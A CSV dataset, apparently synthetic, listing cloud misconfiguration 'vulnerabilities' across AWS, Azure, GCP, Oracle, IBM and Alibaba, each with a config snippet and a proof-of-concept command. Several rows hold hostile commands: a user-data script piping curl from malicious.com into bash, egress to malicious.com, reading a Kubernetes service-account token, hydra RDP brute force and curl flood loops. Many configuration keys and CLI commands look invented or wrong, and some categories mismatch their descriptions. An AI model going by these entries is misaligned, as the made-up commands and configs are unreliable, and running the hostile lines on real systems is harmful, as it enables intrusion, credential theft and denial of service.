id,description,category,cloud_provider,vulnerable_code,poc,source,timestamp
VUL977,IBM Cloud Kubernetes with misconfigured taint policy allowing resource exhaustion.,Denial of Service,IBM Cloud,"{ ""taints"": [] }",kubectl create pod --image=busybox --requests='cpu=1000',"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:56:00Z
VUL978,Alibaba Cloud OSS with misconfigured notification policy allowing data exfiltration.,Data Exfiltration,Alibaba Cloud,"{ ""NotificationConfig"": { ""destination"": ""external-service"" } }",curl https://external-service,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:56:00Z
VUL979,AWS EKS with misconfigured audit policy exposing sensitive data.,Data Exposure,AWS,"{ ""auditPolicy"": { ""destination"": ""public-bucket"" } }",aws s3 ls s3://public-bucket/eks-audit-logs,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/eks'}",2025-06-19T11:56:00Z
VUL980,Azure API Management with misconfigured logging policy exposing sensitive data.,Data Exposure,Azure,"{ ""loggingPolicy"": { ""destination"": ""public-storage"" } }",curl https://storage-account.blob.core.windows.net/container/api-logs,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/api-management'}",2025-06-19T11:56:00Z
VUL981,GCP Cloud Run with misconfigured concurrency limit allowing DoS attacks.,Denial of Service,GCP,gcloud run deploy service --image image --concurrency=1000,for i in {1..1000}; do curl https://service-region.run.app & done,"{'cve': 'N/A', 'link': 'https://cloud.google.com/run/docs'}",2025-06-19T11:56:00Z
VUL982,Oracle Cloud Load Balancer with misconfigured access log policy exposing sensitive data.,Data Exposure,Oracle Cloud,"{ ""accessLogPolicy"": { ""destination"": ""public-bucket"" } }",oci os object list --bucket-name public-bucket,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Balance/Tasks/managingloadbalancers.htm'}",2025-06-19T11:56:00Z
VUL983,IBM Cloud VPC with misconfigured floating IP policy allowing unauthorized access.,Access Control,IBM Cloud,"{ ""floatingIpPolicy"": { ""publicAccess"": true } }",nmap -p- floating-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:56:00Z
VUL984,Alibaba Cloud RDS with misconfigured monitoring policy exposing database metrics.,Data Exposure,Alibaba Cloud,"{ ""MonitoringPolicy"": { ""publicAccess"": true } }",curl https://rds-endpoint/monitoring-metrics,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:56:00Z
VUL985,AWS SNS with misconfigured message policy exposing sensitive data.,Data Exposure,AWS,"{ ""MessagePolicy"": { ""attributes"": { ""sensitive"": ""plain-text-key"" } } }",aws sns publish --topic-arn arn:aws:sns:region:account:topic --message 'test',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sns'}",2025-06-19T11:56:00Z
VUL986,Azure Virtual Network with misconfigured network security group allowing data exfiltration.,Data Exfiltration,Azure,"{ ""securityRules"": [{ ""destinationAddressPrefix"": ""*"", ""access"": ""Allow"" }] }",curl http://malicious.com --interface vnet-ip,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-network'}",2025-06-19T11:56:00Z
VUL987,GCP Cloud SQL with misconfigured binary log retention exposing data.,Data Exposure,GCP,gcloud sql instances create instance --binary-log-retention-days=365,gcloud sql binary-logs list --instance instance,"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:56:00Z
VUL988,Oracle Cloud File Storage with misconfigured snapshot policy allowing data tampering.,Data Exposure,Oracle Cloud,"{ ""snapshotPolicy"": { ""publicAccess"": true } }",oci fs snapshot list --file-system-id fs-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:56:00Z
VUL989,IBM Cloud Databases with misconfigured audit logging exposing sensitive data.,Data Exposure,IBM Cloud,"{ ""auditLogging"": { ""destination"": ""public-bucket"" } }",curl https://s3.bucket/audit-logs,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/databases'}",2025-06-19T11:56:00Z
VUL990,Alibaba Cloud ECS with misconfigured auto-scaling policy allowing DoS attacks.,Denial of Service,Alibaba Cloud,"{ ""AutoScalingPolicy"": { ""maxSize"": 1000 } }",aliyun ess DescribeScalingActivities --ScalingGroupId sg-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25857.htm'}",2025-06-19T11:56:00Z
VUL991,AWS Lambda with misconfigured logging policy exposing sensitive data.,Data Exposure,AWS,"{ ""loggingConfig"": { ""destination"": ""public-bucket"" } }",aws s3 ls s3://public-bucket/lambda-logs,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/lambda'}",2025-06-19T11:56:00Z
VUL992,Azure Kubernetes with misconfigured pod security context allowing privilege escalation.,Privilege Escalation,Azure,"{ ""securityContext"": { ""runAsUser"": 0 } }",kubectl exec pod -- /bin/sh -c 'whoami',"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/aks'}",2025-06-19T11:56:00Z
VUL993,GCP Cloud Run with misconfigured IAM binding allowing unauthorized access.,Access Control,GCP,gcloud run services add-iam-policy-binding service --member='allUsers' --role='roles/run.invoker',curl https://service-region.run.app,"{'cve': 'N/A', 'link': 'https://cloud.google.com/run/docs'}",2025-06-19T11:56:00Z
VUL994,Oracle Cloud Load Balancer with misconfigured health check policy allowing DoS attacks.,Denial of Service,Oracle Cloud,"{ ""healthCheckPolicy"": { ""intervalMs"": 100 } }",for i in {1..1000}; do curl https://lb-ip; done,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Balance/Tasks/managingloadbalancers.htm'}",2025-06-19T11:56:00Z
VUL995,IBM Cloud Functions with misconfigured environment variable exposing secrets.,Data Exposure,IBM Cloud,"{ ""envVars"": { ""SECRET_KEY"": ""plain-text-key"" } }",ibmcloud fn action get action-name --show-env,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:56:00Z
VUL996,Alibaba Cloud OSS with misconfigured bucket policy allowing data exfiltration.,Data Exfiltration,Alibaba Cloud,"{ ""BucketPolicy"": { ""Statement"": [{ ""Action"": ""oss:GetObject"", ""Principal"": ""*"" }] } }",curl https://oss.bucket/file.txt,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:56:00Z
VUL997,AWS API Gateway with misconfigured access logging exposing sensitive data.,Data Exposure,AWS,"{ ""accessLogging"": { ""destination"": ""public-bucket"" } }",aws s3 ls s3://public-bucket/api-logs,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/apigateway'}",2025-06-19T11:56:00Z
VUL998,Azure App Service with misconfigured CORS policy allowing data exfiltration.,Data Exfiltration,Azure,"{ ""corsSettings"": { ""allowedOrigins"": [""*""] } }",curl -H 'Origin: http://malicious.com' https://app-service.azurewebsites.net/data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/app-service'}",2025-06-19T11:56:00Z
VUL999,GCP Cloud Storage with misconfigured bucket ACL allowing data tampering.,Data Exposure,GCP,gsutil acl ch -u allUsers:WRITE gs://bucket,gsutil cp malicious.txt gs://bucket,"{'cve': 'N/A', 'link': 'https://cloud.google.com/storage/docs'}",2025-06-19T11:56:00Z
VUL1000,Oracle Cloud Database with misconfigured audit policy allowing undetected access.,Monitoring,Oracle Cloud,"{ ""auditPolicy"": { ""enabled"": false } }",sqlplus user/pass@db-endpoint:1521/service -e 'SELECT * FROM sensitive_table',"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Database/Tasks/auditing.htm'}",2025-06-19T11:56:00Z
VUL1001,AWS ECS with misconfigured task execution role allowing privilege escalation.,Privilege Escalation,AWS,"{ ""executionRoleArn"": ""arn:aws:iam::account:role/admin-role"" }",aws sts get-caller-identity --profile ecs-task,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/ecs'}",2025-06-19T11:56:00Z
VUL1002,Azure Function with misconfigured trigger binding allowing code injection.,Code Injection,Azure,"{ ""bindings"": [{ ""type"": ""httpTrigger"", ""script"": ""exec('malicious-code')"" }] }",curl https://function-app.azurewebsites.net/api/function,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/azure-functions'}",2025-06-19T11:56:00Z
VUL1003,GCP Cloud Run with misconfigured autoscaling policy allowing resource exhaustion.,Denial of Service,GCP,gcloud run deploy service --image image --max-instances=1000,for i in {1..1000}; do curl https://service-region.run.app & done,"{'cve': 'N/A', 'link': 'https://cloud.google.com/run/docs'}",2025-06-19T11:56:00Z
VUL1004,Oracle Cloud Compute with misconfigured VNIC attachment allowing traffic interception.,Network Security,Oracle Cloud,"{ ""vnicAttachment"": { ""publicIp"": true } }",tcpdump -i eth0 host vnic-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/launchinginstance.htm'}",2025-06-19T11:56:00Z
VUL1005,IBM Cloud Object Storage with misconfigured bucket versioning exposing deleted objects.,Data Exposure,IBM Cloud,"{ ""versioningConfiguration"": { ""status"": ""Suspended"" } }",curl https://s3.bucket/?versions,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/cloud-object-storage'}",2025-06-19T11:56:00Z
VUL1006,Alibaba Cloud SLB with misconfigured health check interval allowing DoS attacks.,Denial of Service,Alibaba Cloud,"{ ""HealthCheckConfig"": { ""interval"": 1 } }",for i in {1..1000}; do curl https://slb-ip; done,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/27595.htm'}",2025-06-19T11:56:00Z
VUL1007,AWS S3 bucket with misconfigured bucket policy allowing data tampering.,Data Exposure,AWS,"{ ""Policy"": { ""Statement"": [{ ""Effect"": ""Allow"", ""Principal"": ""*"", ""Action"": ""s3:PutObject"" }] } }",aws s3 cp malicious.txt s3://bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:56:00Z
VUL1008,Azure SQL Database with misconfigured firewall rule allowing unauthorized access.,Access Control,Azure,"{ ""firewallRules"": [{ ""startIpAddress"": ""0.0.0.0"", ""endIpAddress"": ""255.255.255.255"" }] }",sqlcmd -S sql-server.database.windows.net -U user -P pass,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/azure-sql'}",2025-06-19T11:56:00Z
VUL1009,GCP Cloud Functions with misconfigured trigger allowing unauthorized invocation.,Access Control,GCP,gcloud functions deploy fn --trigger-http --allow-unauthenticated,curl https://us-central1-project.cloudfunctions.net/fn,"{'cve': 'N/A', 'link': 'https://cloud.google.com/functions/docs'}",2025-06-19T11:56:00Z
VUL1010,Oracle Cloud VCN with misconfigured egress rule allowing data exfiltration.,Data Exfiltration,Oracle Cloud,"{ ""securityList"": { ""egressRules"": [{ ""destination"": ""0.0.0.0/0"", ""protocol"": ""all"" }] } }",curl http://malicious.com --interface vcn-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Network/Tasks/managingVCNs.htm'}",2025-06-19T11:56:00Z
VUL1011,IBM Cloud Kubernetes with misconfigured service account allowing privilege escalation.,Privilege Escalation,IBM Cloud,"{ ""serviceAccount"": { ""automountServiceAccountToken"": true } }",kubectl exec pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:56:00Z
VUL1012,Alibaba Cloud RDS with misconfigured audit logging exposing sensitive queries.,Data Exposure,Alibaba Cloud,"{ ""auditLogging"": { ""destination"": ""public-bucket"" } }",aliyun oss ls oss://public-bucket/audit-logs,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:56:00Z
VUL1013,AWS API Gateway with misconfigured IAM policy allowing unauthorized access.,Access Control,AWS,"{ ""Policy"": { ""Statement"": [{ ""Effect"": ""Allow"", ""Principal"": ""*"", ""Action"": ""execute-api:Invoke"" }] } }",curl https://api-id.execute-api.region.amazonaws.com/stage,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/apigateway'}",2025-06-19T11:56:00Z
VUL1014,Azure Cosmos DB with misconfigured role definition allowing privilege escalation.,Privilege Escalation,Azure,"{ ""roleDefinition"": { ""permissions"": [{ ""actions"": [""*""] }] } }",az cosmosdb sql role assignment create --account-name cosmosdb --resource-group rg,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/cosmos-db'}",2025-06-19T11:56:00Z
VUL1015,GCP Cloud Storage with misconfigured IAM binding allowing data exposure.,Data Exposure,GCP,gsutil iam ch allUsers:objectViewer gs://bucket,gsutil cat gs://bucket/sensitive.txt,"{'cve': 'N/A', 'link': 'https://cloud.google.com/storage/docs'}",2025-06-19T11:56:00Z
VUL1016,Oracle Cloud Database with misconfigured backup retention exposing old data.,Data Exposure,Oracle Cloud,"{ ""backupRetention"": { ""days"": 365 } }",oci db backup list --database-id db-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Database/Tasks/managingDBsystem.htm'}",2025-06-19T11:56:00Z
VUL1017,IBM Cloud Functions with misconfigured action binding allowing unauthorized invocation.,Access Control,IBM Cloud,"{ ""actionBinding"": { ""access"": ""public"" } }",ibmcloud fn action invoke action-name,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:56:00Z
VUL1018,Alibaba Cloud OSS with misconfigured bucket encryption exposing data.,Encryption,Alibaba Cloud,"{ ""ServerSideEncryptionRule"": { ""SSEAlgorithm"": ""None"" } }",aliyun oss ls oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:56:00Z
VUL1019,AWS CloudTrail with misconfigured log validation allowing log tampering.,Monitoring,AWS,"{ ""logFileValidationEnabled"": false }",aws s3 cp malicious-log s3://cloudtrail-bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/awscloudtrail'}",2025-06-19T11:56:00Z
VUL1020,Azure Virtual Machine with misconfigured network security group allowing RDP brute force.,Authentication,Azure,"{ ""securityRules"": [{ ""destinationPortRange"": ""3389"", ""sourceAddressPrefix"": ""*"" }] }",hydra -l admin -P passwords.txt rdp://vm-ip,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-machines'}",2025-06-19T11:56:00Z
VUL1021,GCP Cloud Functions with misconfigured memory limit allowing resource exhaustion.,Denial of Service,GCP,gcloud functions deploy fn --memory=8GB,curl https://us-central1-project.cloudfunctions.net/fn?consume=8GB,"{'cve': 'N/A', 'link': 'https://cloud.google.com/functions/docs'}",2025-06-19T11:56:00Z
VUL1022,Oracle Cloud Load Balancer with misconfigured backend policy allowing unauthorized access.,Access Control,Oracle Cloud,"{ ""backendPolicy"": { ""access"": ""public"" } }",curl https://lb-ip/backend,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Balance/Tasks/managingloadbalancers.htm'}",2025-06-19T11:56:00Z
VUL1023,IBM Cloud VPC with misconfigured VPN gateway allowing weak encryption.,Encryption,IBM Cloud,"{ ""vpnGateway"": { ""encryption"": ""DES"" } }",nmap --script ssl-enum-ciphers -p 500 vpn-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:56:00Z
VUL1024,Alibaba Cloud ECS with misconfigured user data allowing code injection.,Code Injection,Alibaba Cloud,"{ ""UserData"": ""#!/bin/bash
curl http://malicious.com/script.sh | bash"" }",aliyun ecs DescribeInstances --InstanceIds instance-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/59643.htm'}",2025-06-19T11:56:00Z
VUL1025,AWS EKS with misconfigured node group allowing privilege escalation.,Privilege Escalation,AWS,"{ ""nodeGroupConfig"": { ""iamRole"": ""arn:aws:iam::account:role/admin"" } }",kubectl exec node-pod -- aws sts get-caller-identity,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/eks'}",2025-06-19T11:56:00Z
VUL1026,Azure API Management with misconfigured logging exposing sensitive data.,Data Exposure,Azure,"{ ""loggingConfig"": { ""destination"": ""public-storage"" } }",curl https://storage-account.blob.core.windows.net/container/api-logs,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/api-management'}",2025-06-19T11:56:00Z
VUL1027,GCP Cloud SQL with misconfigured network authorization allowing unauthorized access.,Access Control,GCP,gcloud sql instances create instance --authorized-networks=0.0.0.0/0,mysql -h sql-ip -u user -p,"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:56:00Z
VUL1028,Oracle Cloud Identity with misconfigured MFA policy allowing weak authentication.,Authentication,Oracle Cloud,"{ ""mfaPolicy"": { ""required"": false } }",oci iam user login --user-id user-id --password weak,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Identity/Tasks/managingusers.htm'}",2025-06-19T11:56:00Z
VUL1029,IBM Cloud Functions with misconfigured logging exposing sensitive data.,Data Exposure,IBM Cloud,"{ ""loggingConfig"": { ""logLevel"": ""DEBUG"", ""destination"": ""public-bucket"" } }",curl https://s3.bucket/function-logs,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:56:00Z
VUL1030,Alibaba Cloud OSS with misconfigured lifecycle rule allowing data exposure.,Data Exposure,Alibaba Cloud,"{ ""LifecycleRule"": { ""Status"": ""Enabled"", ""Expiration"": { ""Days"": 1 } } }",aliyun oss ls oss://bucket/expired-file,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:56:00Z
VUL1031,AWS SNS with misconfigured topic policy allowing unauthorized access.,Access Control,AWS,"{ ""TopicPolicy"": { ""Statement"": [{ ""Effect"": ""Allow"", ""Principal"": ""*"", ""Action"": ""sns:Publish"" }] } }",aws sns publish --topic-arn arn:aws:sns:region:account:topic --message 'test',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sns'}",2025-06-19T11:56:00Z
VUL1032,Azure Event Hub with misconfigured consumer group allowing data leakage.,Data Exposure,Azure,"{ ""consumerGroupConfig"": { ""access"": ""public"" } }",curl https://eventhub-namespace.servicebus.windows.net/hub/consumer-group,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/event-hubs'}",2025-06-19T11:56:00Z
